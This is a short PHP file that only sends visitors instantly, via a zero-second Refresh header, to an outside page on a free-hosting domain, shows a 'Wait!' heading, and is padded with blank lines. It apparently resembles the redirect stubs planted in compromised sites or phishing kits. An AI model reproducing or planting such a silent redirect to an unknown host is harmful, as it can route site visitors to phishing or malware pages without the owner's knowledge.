<?php
header( 'Refresh:0;http://v92366nc.beget.tech/n/index.php');
echo '    
<h1>Wait!</h1>';








	
















?>